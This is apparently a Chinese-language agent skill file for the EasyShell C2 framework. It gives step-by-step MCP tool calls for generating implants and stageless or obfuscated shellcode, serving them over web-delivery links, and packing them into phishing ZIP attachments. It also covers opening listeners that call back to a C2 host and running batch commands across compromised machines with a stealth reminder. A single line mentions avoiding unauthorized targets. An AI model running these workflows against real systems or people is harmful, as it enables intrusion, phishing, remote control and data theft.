---
name: easyshell-payload
description: >-
  EasyShell 载荷生成与投递：GenServer 客户端生成、WebDelivery、Shellcode、
  钓鱼载荷附件。用户生成植入体、配置 Web 投递或钓鱼 ZIP 附件时使用。
---

# easyshell-payload: 载荷生成与投递

> **核心逻辑：** 先有监听器 → 选投递方式（文件/Web/钓鱼附件/shellcode）→ 目标执行后切 [[easyshell-real]]

---

## 零、前置条件

```
1. easyshell_list_listeners() — 确认监听器已 open
2. 记录 listener 字符串：protocol://connectAddress（如 websocket://c2.example.com:443）
3. 可选 pass：植入体连接密码
```

| 投递方式 | 适用场景 | MCP 工具 |
|----------|----------|----------|
| 客户端生成 PE/ELF | 手工投递、U 盘 | `easyshell_gen_payload` |
| Web 投递 | HTTP 下载链接 | `easyshell_start_webdelivery` |
| Shellcode | 注入/加载器 | `easyshell_gen_shellcode` |
| 钓鱼 ZIP 附件 | 邮件演练 | `easyshell_gophish_build_attachment` |

---

## 一、客户端生成（GenServer）

Web：**客户端生成** `/Server`

```python
easyshell_gen_payload(
    os_type="windows",
    arch_type="amd64",
    listener="websocket://your-c2:443",
    output_path="C:/temp/agent.exe",
    pass_phrase="",
    implant_lang="rust",   # rust | go（go 仅 windows）
    legacy_upx=False,
)
```

| 参数 | 说明 |
|------|------|
| os_type | windows / linux / darwin |
| arch_type | amd64 / 386 / arm64 |
| implant_lang | rust（默认，跨平台）/ go（仅 Windows） |
| legacy_upx | UPX 体积压缩（可能增加查杀特征） |

生成物为已 patch 监听器地址的植入体，可直接投递。

---

## 二、Web 投递

Web：**监听管理 → Web 投递** `/Listeners`

### 2.1 启动

```python
easyshell_start_webdelivery(
    listener="websocket://your-c2:443",
    os_name="windows",
    arch="amd64",
    port="8088",           # TeamServer 上新端口，勿与主端口冲突
    filename="",           # 可空，自动默认名
    pass_phrase="",
    use_sgn=False,
)
# 返回下载 URL，发给目标浏览器/curl 即可
```

### 2.2 管理与临时匿名下载

```python
easyshell_list_webdelivery()

# 临时开放匿名下载（默认 15 分钟，防扫描）
easyshell_webdelivery_control("temp-unlock", "8088")

# 停止 / 删除
easyshell_webdelivery_control("close", "8088")
easyshell_webdelivery_control("delete", "8088")
```

**注意：**
- Web 投递端口在 **TeamServer** 上监听，下载流量不经植入体。
- 分阶段 stage 模式需配合 `stage2_filename`；MCP 简版用默认即可，复杂配置走 Web。
- 系统设置可开「监听器一键上线（永久）」长期开放分阶段下载路径。

---

## 三、Shellcode 生成

Web：**客户端生成** 或监听器右键导出

```python
easyshell_gen_shellcode(
    listener="websocket://your-c2:443",
    output_path="./stageless.bin",
    os_type="windows",
    arch_type="amd64",
    pass_phrase="",
    use_sgn=False,   # SGN 混淆，体积变化
)
```

**Stage 分阶段 shellcode：** Web 端按 Web 投递端口或监听器导出；MCP 当前封装 stageless。Stage 一阶段 + WebDelivery 二阶段见 Web `/Server` 与 `/Listeners`。

---

## 四、钓鱼载荷附件

与 [[easyshell-phishing]] 联动，在邮件模板中挂 ZIP：

```python
# 1. 确认钓鱼模块
easyshell_gophish_status()

# 2. 生成 ZIP 附件
easyshell_gophish_build_attachment(
    listener="websocket://your-c2:443",
    os_type="windows",
    arch_type="amd64",
    payload_type="stage_pe",   # stageless | stage_pe
    zip_password="可选",
    output_path="./update.zip",
)
```

Web 模板编辑器也可「一键生成载荷附件」写入模板，无需手动保存文件。

**链路：** 模板附件 → 活动发出 → 监听器收线 → [[easyshell-real]]

---

## 五、监听器快捷操作

```python
easyshell_add_listener("websocket", "0.0.0.0:8443", "c2.example.com:8443")
easyshell_listener_control("open", "0.0.0.0:8443")
easyshell_list_listeners()
```

监听器类型：websocket、tcp、kcp、http-beacon、https-beacon、dns、doh、oss。

---

## 六、多机批量（分组）

```python
# 查看分组
easyshell_list_client_groups()

# 归入分组（Web /Clients 拓扑同数据源）
easyshell_set_client_group(uid, "dmz")

# 对多台执行相同命令（并发≤5，遵守猥琐发育）
easyshell_batch_exec("uid1,uid2,uid3", 'cmd /c "whoami&hostname"')
```

---

## 七、仅 Web 支持的能力

以下 **无 MCP 封装**，须用 Web 控制台：

| 能力 | Web 入口 |
|------|----------|
| 屏幕截屏 / 键鼠 / 录屏历史 | /client/screen |
| HVNC 隐藏桌面 | 客户端菜单 |
| 交互 WebSocket 终端 | /client/shell（WS 模式） |
| Stage 分阶段 shellcode 向导 | /Server、监听器右键 |
| 系统设置 / 数据库 / 审计 | /System |
| 用户账号管理 | 系统设置内 |

屏幕/HVNC 为实时 WebSocket 流，MCP 轮询 `exec_cmd` 无法替代。

---

## 八、操作原则

### ✅ 正确

```
1. 生成前先 list_listeners 确认监听器在线
2. Web 投递先 temp-unlock 再发链接，用完 close
3. 钓鱼附件与活动使用同一监听器
4. 批量命令并发≤5，合并单条 cmd
5. 生成文件勿提交 git
```

### ❌ 错误

```
1. 监听器未 open 就 gen_payload
2. Web 投递端口与 TeamServer 主端口冲突
3. 对未授权目标批量投递
4. 把 GenServer 输出路径写在植入体磁盘上（应保存到操作员本机）
```

---

## 九、关联 Skills

- [[easyshell-phishing]] — 邮件活动与模板
- [[easyshell-real]] — 上线后 C2 操作
- [[easyshell-mcp]] — 全部 MCP 工具映射
- [[easyshell-pentest]] — 全链路渗透
